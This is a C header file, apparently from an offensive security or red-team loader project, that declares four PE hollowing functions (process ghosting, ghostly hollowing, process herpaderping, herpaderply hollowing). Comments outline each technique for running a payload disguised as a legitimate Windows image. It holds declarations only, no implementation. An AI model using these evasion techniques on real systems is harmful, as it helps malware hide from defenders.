#ifndef _HOLLOWING_H
#define _HOLLOWING_H

#include "common.h"

// =============================================
// PE hollowing techniques (map a full PE image, not raw shellcode).
//
// All four take a full PE file buffer + size and a wide-string path to a
// legitimate Windows image used as the decoy / sacrificial host.
// =============================================

// Ghost Process Injection: create a delete-pending section and launch it
// via NtCreateProcessEx, then run the PE entry point with NtCreateThreadEx.
BOOL GhostProcessInject(IN PBYTE pPeBuffer, IN DWORD dwPeSize, IN LPWSTR szLegitImage);

// Ghostly Hollowing: map a ghost section into a suspended legit process,
// patch PEB.ImageBaseAddress, hijack the main thread.
BOOL GhostlyHollow(IN PBYTE pPeBuffer, IN DWORD dwPeSize, IN LPWSTR szLegitImage);

// Process Herpaderping: overwrite temp file with payload, launch from the
// section, then overwrite the temp file with the legit image on disk.
BOOL HerpaderpingProcess(IN PBYTE pPeBuffer, IN DWORD dwPeSize, IN LPWSTR szLegitImage);

// Herpaderply Hollowing: herpaderp section mapped into a suspended process,
// temp file overwritten with legit image, PEB patched, thread hijacked.
BOOL HerpaderplyHollow(IN PBYTE pPeBuffer, IN DWORD dwPeSize, IN LPWSTR szLegitImage);

#endif // _HOLLOWING_H
